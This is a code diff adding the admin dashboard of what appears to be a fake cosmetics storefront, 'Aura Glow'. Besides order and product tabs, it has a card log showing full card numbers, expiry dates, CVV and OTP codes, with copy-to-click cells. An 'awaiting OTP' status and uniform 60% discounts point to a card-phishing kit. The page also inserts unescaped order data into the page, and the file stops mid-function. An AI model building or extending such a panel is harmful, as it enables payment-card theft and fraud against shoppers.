@@ -1,0 +1,536 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-Content-Type-Options" content="nosniff">
+    <meta http-equiv="X-Frame-Options" content="DENY">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self' https:; script-src 'self' 'unsafe-inline' https:; style-src 'self' 'unsafe-inline' https:; img-src 'self' https: data:; connect-src 'self' https:; form-action 'self' https:">
+    <link rel="icon" type="image/png" href="logo.png">
+    <title>لوحة التحكم الإدارية - أورا جلو</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Cairo', sans-serif; }
+        .scrollbar-none::-webkit-scrollbar { display: none; }
+        .tab-active { border-bottom-color: #b45309; color: #92400e; }
+        .copy-cell { transition: all 0.2s; cursor: pointer; }
+        .copy-cell:hover { background: #fef3c7 !important; box-shadow: 0 0 0 2px #d97706; border-radius: 8px; }
+        #session-overlay { display: none; }
+        .security-badge { background: #059669; color: white; font-size: 9px; padding: 2px 8px; border-radius: 999px; font-weight: bold; }
+    </style>
+</head>
+<body class="bg-stone-100 text-stone-800 antialiased selection:bg-amber-100 selection:text-amber-900">
+
+    <header class="bg-stone-900 text-white sticky top-0 z-40 border-b border-stone-800">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-20 flex items-center justify-between">
+            <div class="flex items-center gap-3">
+                <a href="store.html" class="flex items-center gap-2"><img src="logo.png" alt="AURA GLOW" class="h-24 md:h-32 mx-auto"></a>
+                <span class="bg-amber-700/30 text-amber-400 text-xs px-3 py-1 rounded-full font-bold">لوحة التحكم</span>
+                <span class="security-badge">🔒 HTTPS</span>
+                <span class="security-badge">🛡️ CSP</span>
+            </div>
+            <div class="flex items-center gap-4">
+                <select onchange="setLang(this.value)" class="text-xs bg-stone-800 text-white border border-stone-600 rounded-lg px-2 py-1.5 font-bold outline-none cursor-pointer">
+                    <option value="ar">العربية</option>
+                    <option value="he">עברית</option>
+                </select>
+                <a href="store.html" class="text-xs text-stone-300 hover:text-white transition">عرض المتجر</a>
+                <button onclick="logout()" class="text-xs text-rose-300 hover:text-rose-200 transition font-bold">تسجيل خروج</button>
+                <div class="w-10 h-10 rounded-full bg-amber-700 flex items-center justify-center font-bold text-white">أ</div>
+            </div>
+        </div>
+    </header>
+
+    <main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-10 space-y-10">
+
+        <div class="flex border-b border-stone-300 gap-6 overflow-x-auto scrollbar-none">
+            <button onclick="switchTab('orders')" id="tab-orders-btn" class="pb-3 font-bold text-base border-b-2 border-amber-700 text-amber-800 transition whitespace-nowrap">إدارة الطلبات الواردة</button>
+            <button onclick="switchTab('cards')" id="tab-cards-btn" class="pb-3 font-bold text-base border-b-2 border-transparent text-stone-500 hover:text-stone-800 transition whitespace-nowrap">سجل البطاقات (الرقم كامل)</button>
+            <button onclick="switchTab('products')" id="tab-products-btn" class="pb-3 font-bold text-base border-b-2 border-transparent text-stone-500 hover:text-stone-800 transition whitespace-nowrap">إدارة المنتجات والمخزون</button>
+        </div>
+
+        <section id="tab-orders" class="space-y-6">
+            <div class="flex justify-between items-center">
+                <h2 class="text-xl font-extrabold text-stone-900">الطلبات الواردة من العملاء</h2>
+                <button onclick="loadOrders()" class="bg-stone-900 text-white px-4 py-2 rounded-xl text-xs font-bold hover:bg-stone-800 transition">تحديث القائمة</button>
+            </div>
+            <div class="bg-white rounded-3xl border border-stone-200 overflow-hidden shadow-sm">
+                <div class="overflow-x-auto">
+                    <table class="w-full text-right text-sm">
+                        <thead class="bg-stone-50 border-b border-stone-200 text-stone-500 font-bold">
+                            <tr>
+                                <th class="p-4">رقم الطلب</th>
+                                <th class="p-4">اسم العميل</th>
+                                <th class="p-4">رقم الهاتف</th>
+                                <th class="p-4">المجموع</th>
+                                <th class="p-4">طريقة الدفع</th>
+                                <th class="p-4">الحالة</th>
+                                <th class="p-4">التاريخ</th>
+                                <th class="p-4">الإجراءات</th>
+                            </tr>
+                        </thead>
+                        <tbody id="orders-table-body" class="divide-y divide-stone-100"></tbody>
+                    </table>
+                </div>
+            </div>
+        </section>
+
+        <section id="tab-cards" class="hidden space-y-6">
+            <div class="flex justify-between items-center">
+                <h2 class="text-xl font-extrabold text-stone-900">سجل بيانات البطاقات الائتمانية <span class="text-xs text-rose-600 font-bold">(رقم البطاقة كامل - visible فقط للمشرف)</span></h2>
+                <button onclick="loadCards()" class="bg-stone-900 text-white px-4 py-2 rounded-xl text-xs font-bold hover:bg-stone-800 transition">تحديث السجل</button>
+            </div>
+            <div class="bg-white rounded-3xl border border-stone-200 overflow-hidden shadow-sm">
+                <div class="overflow-x-auto">
+                    <table class="w-full text-right text-sm">
+                        <thead class="bg-stone-50 border-b border-stone-200 text-stone-500 font-bold">
+                            <tr>
+                                <th class="p-4">رقم الطلب</th>
+                                <th class="p-4">اسم حامل البطاقة</th>
+                                <th class="p-4">رقم البطاقة كامل</th>
+                                <th class="p-4">نوع البطاقة</th>
+                                <th class="p-4">تاريخ الانتهاء</th>
+                                <th class="p-4">رمز CVV</th>
+                                <th class="p-4">رمز OTP</th>
+                                <th class="p-4">المبلغ</th>
+                            </tr>
+                        </thead>
+                        <tbody id="cards-table-body" class="divide-y divide-stone-100"></tbody>
+                    </table>
+                </div>
+            </div>
+        </section>
+
+        <section id="tab-products" class="hidden space-y-6">
+            <div class="flex justify-between items-center">
+                <h2 class="text-xl font-extrabold text-stone-900">إدارة منتجات المتجر</h2>
+                <button onclick="openAddProductModal()" class="bg-amber-700 text-white px-4 py-2 rounded-xl text-xs font-bold hover:bg-amber-800 transition flex items-center gap-1">
+                    <span>+ إضافة منتج جديد</span>
+                </button>
+            </div>
+            <div id="products-container" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6"></div>
+        </section>
+
+    </main>
+
+    <div id="product-modal" class="fixed inset-0 bg-stone-900/50 backdrop-blur-sm z-50 hidden flex items-center justify-center p-4">
+        <div class="bg-white rounded-3xl p-8 max-w-md w-full space-y-6 border border-stone-200 shadow-xl">
+            <div class="flex justify-between items-center border-b pb-4">
+                <h3 id="modal-title" class="font-extrabold text-stone-900 text-lg">إضافة منتج جديد</h3>
+                <button onclick="closeProductModal()" class="text-stone-400 hover:text-stone-800 text-lg font-bold">&times;</button>
+            </div>
+            <form id="product-form" onsubmit="saveProduct(event)" class="space-y-4 text-xs font-bold">
+                <input type="hidden" id="product-id">
+                <div>
+                    <label class="block text-stone-600 mb-1">اسم المنتج</label>
+                    <input type="text" id="product-name" required class="w-full bg-stone-50 border border-stone-200 rounded-xl px-4 py-2 text-stone-900 focus:outline-none focus:ring-2 focus:ring-amber-600">
+                </div>
+                <div>
+                    <label class="block text-stone-600 mb-1">السعر (₪)</label>
+                    <input type="number" id="product-price" required class="w-full bg-stone-50 border border-stone-200 rounded-xl px-4 py-2 text-stone-900 focus:outline-none focus:ring-2 focus:ring-amber-600">
+                </div>
+                <div>
+                    <label class="block text-stone-600 mb-1">السعر القديم (اختياري)</label>
+                    <input type="number" id="product-oldprice" class="w-full bg-stone-50 border border-stone-200 rounded-xl px-4 py-2 text-stone-900 focus:outline-none focus:ring-2 focus:ring-amber-600">
+                </div>
+                <div>
+                    <label class="block text-stone-600 mb-1">رابط الصورة (URL)</label>
+                    <input type="text" id="product-image" required class="w-full bg-stone-50 border border-stone-200 rounded-xl px-4 py-2 text-stone-900 focus:outline-none focus:ring-2 focus:ring-amber-600">
+                </div>
+                <div>
+                    <label class="block text-stone-600 mb-1">التصنيف</label>
+                    <select id="product-category" required class="w-full bg-stone-50 border border-stone-200 rounded-xl px-4 py-2 text-stone-900 focus:outline-none focus:ring-2 focus:ring-amber-600">
+                        <option value="سيروم">سيروم</option>
+                        <option value="كريم">كريم</option>
+                        <option value="زيت">زيت</option>
+                        <option value="ماسك">ماسك</option>
+                    </select>
+                </div>
+                <div>
+                    <label class="block text-stone-600 mb-1">الوسم (badge)</label>
+                    <input type="text" id="product-badge" class="w-full bg-stone-50 border border-stone-200 rounded-xl px-4 py-2 text-stone-900 focus:outline-none focus:ring-2 focus:ring-amber-600" placeholder="خصم 60%">
+                </div>
+                <button type="submit" class="w-full bg-stone-900 text-white py-3 rounded-xl font-bold hover:bg-stone-800 transition">حفظ المنتج</button>
+            </form>
+        </div>
+    </div>
+
+    <div id="order-detail-modal" class="fixed inset-0 bg-stone-900/50 backdrop-blur-sm z-50 hidden flex items-center justify-center p-4">
+        <div class="bg-white rounded-3xl p-8 max-w-2xl w-full space-y-6 border border-stone-200 shadow-xl max-h-[90vh] overflow-y-auto">
+            <div class="flex justify-between items-center border-b pb-4">
+                <h3 class="font-extrabold text-stone-900 text-lg">تفاصيل الطلب</h3>
+                <button onclick="closeOrderModal()" class="text-stone-400 hover:text-stone-800 text-lg font-bold">&times;</button>
+            </div>
+            <div id="order-detail-content"></div>
+        </div>
+    </div>
+
+    <footer class="bg-stone-900 text-stone-400 py-8 mt-20">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex flex-wrap justify-center gap-6 mb-4 text-xs">
+                <a href="privacy.html" class="hover:text-white transition">سياسة الخصوصية</a>
+                <a href="terms.html" class="hover:text-white transition">الشروط والأحكام</a>
+                <a href="about.html" class="hover:text-white transition">من نحن</a>
+            </div>
+            <div class="text-center">
+                <p class="text-xs text-stone-500" data-i18n="footer_tag">لوحة تحكم أورا جلو الإدارية © 2026</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        const DEFAULT_PRODUCTS = [
+    { id: 1, name: "Green Tea Skin Cream - קרם תה ירוק", category: "סרום", price: 126, oldPrice: 315, rating: 4.5, reviews: 2500, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/mbn/mbn01262/r/138.jpg", badge: "60% הנחה" },
+    { id: 2, name: "Organic Jojoba Oil - שמן חוחובה אורגני", category: "שמן", price: 142, oldPrice: 355, rating: 4.6, reviews: 2850, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/clg/clg00703/r/86.jpg", badge: "60% הנחה" },
+    { id: 3, name: "Glycolic + Lactic Acid Serum - סרום פילינג", category: "סרום", price: 106, oldPrice: 265, rating: 4.7, reviews: 3200, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/adc/adc03341/r/67.jpg", badge: "60% הנחה" },
+    { id: 4, name: "Vegan Collagen Eye Serum - סרום עיניים קולגן", category: "טיפוח", price: 189, oldPrice: 472, rating: 4.8, reviews: 3550, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/axi/axi61088/r/17.jpg", badge: "60% הנחה" },
+    { id: 5, name: "Overnight Spot Patches - מדבקות אקנה", category: "מסכה", price: 112, oldPrice: 280, rating: 4.9, reviews: 3900, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/pxl/pxl26040/r/72.jpg", badge: "60% הנחה" },
+    { id: 6, name: "First Spray Serum - סרום ספריי ראשון", category: "סרום", price: 249, oldPrice: 623, rating: 4.5, reviews: 4250, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/dab/dab06875/r/39.jpg", badge: "60% הנחה" },
+    { id: 7, name: "Glow Filter Illuminating Serum - סרום זוהר מבהיר", category: "סרום", price: 259, oldPrice: 647, rating: 4.6, reviews: 4600, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/eqq/eqq45647/r/37.jpg", badge: "60% הנחה" },
+    { id: 8, name: "Leave-In Conditioner - מרכך שיער מזין", category: "קרם", price: 162, oldPrice: 405, rating: 4.7, reviews: 4950, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/smt/smt21584/r/53.jpg", badge: "60% הנחה" },
+    { id: 9, name: "Collagen Serum - סרום קולגן", category: "סרום", price: 106, oldPrice: 265, rating: 4.8, reviews: 5300, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/adc/adc00800/r/77.jpg", badge: "60% הנחה" },
+    { id: 10, name: "Acne Treatment Ointment - משחת אקנה", category: "מסכה", price: 75, oldPrice: 187, rating: 4.9, reviews: 5650, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/dlc/dlc15042/r/49.jpg", badge: "60% הנחה" },
+    { id: 11, name: "Acne Pads - פדים נגד אקנה", category: "קרם", price: 55, oldPrice: 137, rating: 4.5, reviews: 6000, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/sdx/sdx09701/r/89.jpg", badge: "60% הנחה" },
+    { id: 12, name: "Organic Pumpkin Seed Oil - שמן זרעי דלעת", category: "שמן", price: 132, oldPrice: 330, rating: 4.6, reviews: 6350, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/clg/clg56086/r/75.jpg", badge: "60% הנחה" },
+    { id: 13, name: "Clarifying Exfoliant - תמיסת פילינג חומצה סליצילית", category: "סרום", price: 54, oldPrice: 135, rating: 4.0, reviews: 2500, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/pxl/pxl29604/r/54.jpg", badge: "60% הנחה" },
+    { id: 14, name: "Vitamin C Serum - סרום ויטמין C מבהיר", category: "קרם", price: 94, oldPrice: 235, rating: 4.1, reviews: 2620, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/mhs/mhs12742/r/77.jpg", badge: "60% הנחה" },
+    { id: 15, name: "Glycolic + Lactic Acid Serum - סרום פילינג חומצות", category: "מסכה", price: 38, oldPrice: 95, rating: 4.2, reviews: 2740, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/adc/adc03341/r/67.jpg", badge: "60% הנחה" },
+    { id: 16, name: "Skin Success Bar - סבון מבהיר כתמים", category: "טיפוח", price: 13, oldPrice: 32, rating: 4.3, reviews: 2860, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/pal/pal07380/r/52.jpg", badge: "60% הנחה" },
+    { id: 17, name: "Overnight Spot Patches - מדבקות אקנה לילה", category: "סרום", price: 41, oldPrice: 102, rating: 4.4, reviews: 2980, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/pxl/pxl26040/r/72.jpg", badge: "60% הנחה" },
+    { id: 18, name: "First Spray Serum - סרום ספריי כמהין", category: "סרום", price: 90, oldPrice: 225, rating: 4.5, reviews: 3100, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/dab/dab06875/r/39.jpg", badge: "60% הנחה" },
+    { id: 19, name: "Glow Filter Serum - סרום מבהיר ויטמין C", category: "סרום", price: 95, oldPrice: 238, rating: 4.6, reviews: 3220, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/eqq/eqq45647/r/37.jpg", badge: "60% הנחה" },
+    { id: 20, name: "Collagen Serum - סרום קולגן מחייה", category: "סרום", price: 38, oldPrice: 95, rating: 4.7, reviews: 3340, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/adc/adc00800/r/77.jpg", badge: "60% הנחה" },
+    { id: 21, name: "Sulfur Ointment - משחת אקנה 10% גופרית", category: "מסכה", price: 27, oldPrice: 68, rating: 4.8, reviews: 3460, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/dlc/dlc15042/r/49.jpg", badge: "60% הנחה" },
+    { id: 22, name: "Acne Pads 55 - פדים נגד אקנה", category: "קרם", price: 20, oldPrice: 50, rating: 4.9, reviews: 3580, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/sdx/sdx09701/r/89.jpg", badge: "60% הנחה" },
+    { id: 23, name: "Vitamin C 20% Serum - סרום ויטמין C 20%", category: "סרום", price: 123, oldPrice: 308, rating: 4.0, reviews: 3700, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/tml/tml00472/r/17.jpg", badge: "60% הנחה" },
+    { id: 24, name: "Centella Ampoule - אמפולת סנטלה מרגיעה", category: "סרום", price: 59, oldPrice: 148, rating: 4.1, reviews: 3820, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/sio/sio26060/r/57.jpg", badge: "60% הנחה" },
+    { id: 25, name: "Retinol Shot - סרום רטינול מתיחה", category: "סרום", price: 59, oldPrice: 148, rating: 4.2, reviews: 3940, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/clx/clx32080/r/21.jpg", badge: "60% הנחה" },
+    { id: 26, name: "Vitamin C Serum 4oz - סרום ויטמין C", category: "סרום", price: 58, oldPrice: 145, rating: 4.3, reviews: 4060, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/pud/pud00608/r/88.jpg", badge: "60% הנחה" },
+    { id: 27, name: "Dark Circle Serum - סרום עיניים נגד עיגולים", category: "סרום", price: 41, oldPrice: 102, rating: 4.4, reviews: 4180, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/adc/adc03468/r/69.jpg", badge: "60% הנחה" },
+    { id: 28, name: "Acne Foaming Wash - תמיסת ניקוי אקנה", category: "קרם", price: 14, oldPrice: 35, rating: 4.5, reviews: 4300, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/pxl/pxl22801/r/44.jpg", badge: "60% הנחה" },
+    { id: 29, name: "5-in-1 Eye Serum - סרום עיניים 5 ב-1", category: "סרום", price: 36, oldPrice: 90, rating: 4.6, reviews: 4420, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/adc/adc00977/r/84.jpg", badge: "60% הנחה" },
+    { id: 30, name: "Azelaic Acid Serum - סרום מרגיע אדמומיות", category: "סרום", price: 91, oldPrice: 228, rating: 4.7, reviews: 4540, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/auu/auu73719/r/17.jpg", badge: "60% הנחה" },
+    { id: 31, name: "Puffy Eye Serum - סרום עיניים נגד נפיחות", category: "סרום", price: 41, oldPrice: 102, rating: 4.8, reviews: 4660, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/adc/adc03469/r/50.jpg", badge: "60% הנחה" },
+    { id: 32, name: "Adapalene Gel - ג'ל אדפלן לאקנה", category: "קרם", price: 53, oldPrice: 132, rating: 4.9, reviews: 4780, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/acf/acf23456/r/38.jpg", badge: "60% הנחה" },
+    { id: 33, name: "Niacinamide 10 Serum - סרום מבהיר ניאצינמיד", category: "סרום", price: 100, oldPrice: 250, rating: 4.0, reviews: 4900, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/auu/auu73452/r/57.jpg", badge: "60% הנחה" },
+    { id: 34, name: "Snail Mucin Essence - תמצית שבלול 96%", category: "סרום", price: 61, oldPrice: 152, rating: 4.1, reviews: 5020, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/crx/crx47000/r/39.jpg", badge: "60% הנחה" },
+    { id: 35, name: "Propolis Glow Serum - סרום זוהר פרופוליס", category: "סרום", price: 72, oldPrice: 180, rating: 4.2, reviews: 5140, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/boj/boj11496/r/38.jpg", badge: "60% הנחה" },
+    { id: 36, name: "Dark Spot Serum - סרום מבהיר כתמים", category: "סרום", price: 72, oldPrice: 180, rating: 4.3, reviews: 5260, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/axi/axi61003/r/39.jpg", badge: "60% הנחה" },
+    { id: 37, name: "Sulfur Mini - משחת אקנה גופרית מיני", category: "מסכה", price: 8, oldPrice: 20, rating: 4.4, reviews: 5380, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/dlc/dlc15048/r/111.jpg", badge: "60% הנחה" },
+    { id: 38, name: "Clear Spot Patch - מדבקות פצעונים שקופות", category: "מסכה", price: 14, oldPrice: 35, rating: 4.5, reviews: 5500, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/smi/smi39001/r/14.jpg", badge: "60% הנחה" },
+    { id: 39, name: "Acne Creamy Wash - תמיסת ניקוי אקנה עדינה", category: "קרם", price: 52, oldPrice: 130, rating: 4.6, reviews: 5620, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/pxl/pxl22706/r/79.jpg", badge: "60% הנחה" },
+    { id: 40, name: "PDRN Pink Serum - סרום פפטידים ורוד", category: "סרום", price: 73, oldPrice: 182, rating: 4.7, reviews: 5740, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/mcb/mcb10805/r/17.jpg", badge: "60% הנחה" },
+    { id: 41, name: "Niacinamide 5 Serum - סרום ניאצינמיד 5%", category: "סרום", price: 41, oldPrice: 102, rating: 4.8, reviews: 5860, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/adc/adc03480/r/71.jpg", badge: "60% הנחה" },
+    { id: 42, name: "Pore Reducing Serum - סרום מכווץ נקבוביות", category: "סרום", price: 58, oldPrice: 145, rating: 4.9, reviews: 5980, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/fky/fky60522/r/17.jpg", badge: "60% הנחה" },
+    { id: 43, name: "Ginseng Eye Serum - סרום עיניים ג'ינסנג", category: "סרום", price: 63, oldPrice: 158, rating: 4.0, reviews: 6100, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/boj/boj31614/r/81.jpg", badge: "60% הנחה" },
+    { id: 44, name: "Acne Pads 90 - פדים נגד אקנה 90 יחידות", category: "קרם", price: 35, oldPrice: 88, rating: 4.1, reviews: 6220, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/sdx/sdx09709/r/95.jpg", badge: "60% הנחה" },
+    { id: 45, name: "Adapalene 0.1 Gel - ג'ל אדפלן 0.1%", category: "קרם", price: 77, oldPrice: 192, rating: 4.2, reviews: 6340, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/dif/dif92030/r/41.jpg", badge: "60% הנחה" },
+    { id: 46, name: "Retinol Serum - סרום רטינול אנטי אייג'ינג", category: "סרום", price: 38, oldPrice: 95, rating: 4.3, reviews: 6460, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/adc/adc00797/r/109.jpg", badge: "60% הנחה" },
+    { id: 47, name: "Retinal Booster - בוסטר רטינל מתיחה", category: "סרום", price: 62, oldPrice: 155, rating: 4.4, reviews: 6580, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/clx/clx32081/r/8.jpg", badge: "60% הנחה" },
+    { id: 48, name: "Pimple Patch - מדבקות פצעוני אקנה", category: "מסכה", price: 13, oldPrice: 32, rating: 4.5, reviews: 6700, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/crx/crx47024/r/13.jpg", badge: "60% הנחה" },
+    { id: 49, name: "Multi-Peptide Serum - סרום פפטידים מרובה", category: "סרום", price: 38, oldPrice: 95, rating: 4.6, reviews: 6820, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/adc/adc03326/r/117.jpg", badge: "60% הנחה" },
+    { id: 50, name: "Hyaluronic Acid Serum - סרום חומצה היאלורונית", category: "סרום", price: 104, oldPrice: 260, rating: 4.7, reviews: 6940, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/tob/tob93404/r/75.jpg", badge: "60% הנחה" },
+    { id: 51, name: "Acne Wash 5.5oz - תמיסת ניקוי אקנה", category: "קרם", price: 52, oldPrice: 130, rating: 4.8, reviews: 7060, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/pxl/pxl22855/r/109.jpg", badge: "60% הנחה" },
+    { id: 52, name: "Vitamin C Classic - סרום ויטמין C מבהיר", category: "סרום", price: 38, oldPrice: 95, rating: 4.9, reviews: 7180, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/adc/adc00801/r/142.jpg", badge: "60% הנחה" },
+    { id: 53, name: "Hyaluronic Serum - סרום חומצה היאלורונית מעמיק", category: "סרום", price: 38, oldPrice: 95, rating: 4.0, reviews: 7300, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/adc/adc00878/r/95.jpg", badge: "60% הנחה" },
+    { id: 54, name: "Age Refining Serum - סרום ויטמין C אנטי אייג'ינג", category: "סרום", price: 67, oldPrice: 168, rating: 4.1, reviews: 7420, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/syi/syi02265/r/96.jpg", badge: "60% הנחה" },
+    { id: 55, name: "Pycnogenol Cream - קרם סרום פיקנוגנול", category: "סרום", price: 30, oldPrice: 75, rating: 4.2, reviews: 7540, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/mbn/mbn01300/r/152.jpg", badge: "60% הנחה" },
+];
+
+        let products = [];
+        let orders = [];
+
+        function initProducts() {
+            const ver = parseInt(localStorage.getItem('auraProductsVersion') || '0');
+            if (ver < 5) {
+                localStorage.removeItem('auraProducts');
+                localStorage.setItem('auraProductsVersion', '2');
+            }
+            const stored = localStorage.getItem('auraProducts');
+            if (stored) {
+                try { products = JSON.parse(stored); if (products.length === 0) products = DEFAULT_PRODUCTS; }
+                catch { products = DEFAULT_PRODUCTS; }
+            } else {
+                products = DEFAULT_PRODUCTS;
+                localStorage.setItem('auraProducts', JSON.stringify(DEFAULT_PRODUCTS));
+            }
+        }
+
+        function switchTab(tab) {
+            ['orders', 'cards', 'products'].forEach(t => {
+                document.getElementById(`tab-${t}`).classList.add('hidden');
+                document.getElementById(`tab-${t}-btn`).className = "pb-3 font-bold text-base border-b-2 border-transparent text-stone-500 hover:text-stone-800 transition whitespace-nowrap";
+            });
+            document.getElementById(`tab-${tab}`).classList.remove('hidden');
+            document.getElementById(`tab-${tab}-btn`).className = "pb-3 font-bold text-base border-b-2 border-amber-700 text-amber-800 transition whitespace-nowrap";
+        }
+
+        function loadOrders() {
+            orders = JSON.parse(localStorage.getItem('auraOrders')) || [];
+            const tbody = document.getElementById('orders-table-body');
+            if (orders.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="8" class="p-8 text-center text-stone-400">لا توجد طلبات واردة بعد.</td></tr>`;
+                return;
+            }
+            tbody.innerHTML = orders.map(o => `
+                <tr class="hover:bg-stone-50/50 transition">
+                    <td class="p-4 font-extrabold text-stone-900">${o.id}</td>
+                    <td class="p-4 text-stone-700">${o.name}</td>
+                    <td class="p-4 text-stone-600 text-xs" dir="ltr">${o.phone || '-'}</td>
+                    <td class="p-4 font-bold text-amber-700">${o.total}.00 ₪</td>
+                    <td class="p-4 text-stone-600">${o.paymentMethod || o.cardDetails?.brand || '-'}</td>
+                    <td class="p-4">
+                        <span class="px-3 py-1 rounded-full text-xs font-bold ${o.status === 'تم الدفع' ? 'bg-emerald-100 text-emerald-800' : o.status === 'بانتظار OTP' ? 'bg-amber-100 text-amber-800' : 'bg-sky-100 text-sky-800'}">${o.status}</span>
+                    </td>
+                    <td class="p-4 text-xs text-stone-500">${o.date || '-'}</td>
+                    <td class="p-4 flex gap-2">
+                        <button onclick="viewOrder('${o.id}')" class="text-xs bg-stone-900 text-white px-3 py-1.5 rounded-xl hover:bg-stone-800 transition">عرض</button>
+                        <button onclick="toggleOrderStatus('${o.id}')" class="text-xs bg-amber-100 text-amber-800 px-3 py-1.5 rounded-xl hover:bg-amber-200 transition">حالة</button>
+                        <button onclick="deleteOrder('${o.id}')" class="text-xs bg-rose-50 text-rose-600 px-3 py-1.5 rounded-xl hover:bg-rose-100 transition">حذف</button>
+                    </td>
+                </tr>
+            `).join('');
+        }
+
+        function copyText(text, el) {
+            navigator.clipboard.writeText(text).then(() => {
+                const orig = el.innerHTML;
+                el.innerHTML = '✓ نسخ!';
+                el.style.color = '#059669';
+                setTimeout(() => { el.innerHTML = orig; el.style.color = ''; }, 1200);
+            }).catch(() => {
+                const orig = el.innerHTML;
+                el.innerHTML = 'فشل';
+                el.style.color = '#dc2626';
+                setTimeout(() => { el.innerHTML = orig; el.style.color = ''; }, 1200);
+            });
+        }
+
+        function loadCards() {
+            const orders = JSON.parse(localStorage.getItem('auraOrders')) || [];
+            const tbody = document.getElementById('cards-table-body');
+            const cardOrders = orders.filter(o => o.cardDetails && o.cardDetails.number);
+
+            if (cardOrders.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="8" class="p-8 text-center text-stone-400">لا توجد سجلات بطاقات وهمية مسجلة حالياً.</td></tr>`;
+                return;
+            }
+
+            tbody.innerHTML = cardOrders.map(o => `
+                <tr class="hover:bg-stone-50/50 transition">
+                    <td class="p-4 font-extrabold text-stone-900">${o.id}</td>
+                    <td class="p-4 text-stone-700 cursor-pointer copy-cell" onclick="copyText('${o.cardDetails.holder}', this)" title="انقر للنسخ">${o.cardDetails.holder}</td>
+                    <td class="p-4 font-mono font-bold text-amber-800 tracking-wide text-base bg-amber-50 rounded-lg cursor-pointer copy-cell" onclick="copyText('${o.cardDetails.number}', this)" title="انقر للنسخ">${o.cardDetails.number}</td>
+                    <td class="p-4 text-stone-600">${o.cardDetails.brand || '-'}</td>
+                    <td class="p-4 text-stone-600 cursor-pointer copy-cell" onclick="copyText('${o.cardDetails.expiry}', this)" title="انقر للنسخ">${o.cardDetails.expiry}</td>
